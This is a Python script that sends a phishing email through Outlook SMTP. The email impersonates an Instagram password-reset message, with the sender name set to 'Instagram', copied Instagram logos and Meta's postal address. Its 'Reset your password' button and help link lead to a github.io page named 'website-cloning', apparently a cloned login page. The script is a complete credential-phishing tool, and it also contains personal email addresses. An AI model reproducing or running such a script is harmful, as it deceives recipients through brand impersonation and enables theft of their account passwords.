import os 
import smtplib
from email.message import EmailMessage
from email.utils import formataddr
from pathlib import Path

from dotenv import load_dotenv #pip install python-dotenv

PORT=587
EMAIL_SERVER= "smtp-mail.outlook.com"

current_dir = Path(__file__).resolve().parent if "__file__" in locals() else Path.cwd()
envars = current_dir / ".env"
load_dotenv(envars)

# Read environment variables
sender_email = os.getenv("EMAIL")
password_email = os.getenv("PASSWORD")


def send_email(subject, receiver_email, name):
    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = formataddr(("Instagram", f"{sender_email}"))
    msg["To"] = receiver_email
    msg["BCC"] = sender_email

    msg.set_content(
        f"""\
        Hi {name},
        
        We got a request to reset your Instagram password.

        
        Reset password

        If you ignore this message, your password will not be changed. If you didn't request a password reset, let us know.

        © Instagram. Meta Platforms, Inc., 1601 Willow Road, Menlo Park, CA 94025
        This message was sent to wcastillopujols1@gmail.com and intended for sneakerspot.rd. Not your account? Remove your email from this account.
        """
    )
    # Add the html version.  This converts the message into a multipart/alternative
    # container, with the original text message as the first part and the new html
    # message as the second part.
    
    msg.add_alternative(
        f"""\
    <html>
    <body>
        <div style="width: 600px; height: 665.5; margin: 0 auto;">
            <div>
                <img src="https://ci4.googleusercontent.com/proxy/vHv3tRtE3I_2w6zR6JFt066OaSywcGpzkuO02W6QMIeOfCWNMc-TyEJKxu4mG2hoBsYBLNnCt6VSzhJNl2kOXcZTRdglv3R20xUvvc29ow=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/Otjcwa2eCOF.png"
                    height="33" style="padding-bottom: 15px;">
            </div>
            <div style="font-family: Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; font-size:small/1.5; margin-left: 85px; margin-right: 85px;">
                <p style="margin:10px 0px;color:rgb(86,90,92);font-size:18px; ">Hi, {name} </p>
                <p style="margin:10px 0px;color:rgb(86,90,92);font-size:18px;"> 
                Sorry to hear you’re having trouble logging into Instagram. We got a message that you forgot your password. If this was
                you, you can get right back into your account or reset your password now.
                </p>


                <div style="display: flex; justify-content: center;">
                <a href="https://wcastillo01.github.io/website-cloning/index.html" style="color:rgb(27,116,228);text-decoration-line:none;display:block"> 
                <font size="3"  style="font-family:Helvetica NeueHelvetica,Roboto,Arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:rgb(253,253,253);font-size:16px;line-height:16px; border-collapse:collapse;border-radius:3px;text-align:center;display:block;border:1px solid rgb(0,159,223);padding:10px 120px 14px;min-width:80px;background-color:rgb(71,162,234); margin-top: 30px;"> Reset your password</font>
                </a>
                </div>

                <div style="padding:0px;margin: 40px 0px;color:rgb(86,90,92);font-size:16px">
                    If you didn’t request a login link or a password reset, you can ignore this message and
                    <a href="https://wcastillo01.github.io/website-cloning/index.html" style="color:rgb(27,116,228);text-decoration-line:none">learn more about why you may have received it</a>.
                    <br>
                    <br>
                    Only people who know your Instagram password or click the login link in this email can log into your account.
                </div>

                <div style="padding-top:10px;text-align:center ;">
                    <img src="https://ci4.googleusercontent.com/proxy/EJZbh4o__ilxW-Qeu9CLvNAN7DS93sdYd0ZWHbRbsuZTMeA01I_dPjJ8ksrB2zX5CDoDyOrShH2RhVZy5cghftAAEMZI0T10gEk20cA2OA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/y3/r/Bqo9-L659wB.png" height="26" width="52">
                    <br>
                    <div style="height:10px"></div>
                    <div style="color:rgb(171,173,174);font-size:11px;margin:0px auto 5px">
                    © Instagram. Meta Platforms, Inc., 1601 Willow Road, Menlo Park, CA 94025
                    <br>
                    </div>
                    <div style="color:rgb(171,173,174);font-size:11px;margin:0px auto 5px">
                        This message was sent to
                        <u>{receiver_email}</u>
                        . Not your account? Remove your email from this account.
                    </div>
                </div>
            </div>
            <div style="margin-top: 100px"></div>
        </div>
    </body>
    </html>
    """,
        subtype="html",
    )

    with smtplib.SMTP(EMAIL_SERVER, PORT) as server:
        server.starttls()
        server.login(sender_email, password_email)
        server.sendmail(sender_email, receiver_email, msg.as_string())


if __name__ == "__main__":
    send_email(
        subject="Reset your password",
        name="wcastillo_1",
        receiver_email="wcastillopujols1@gmail.com",
    )


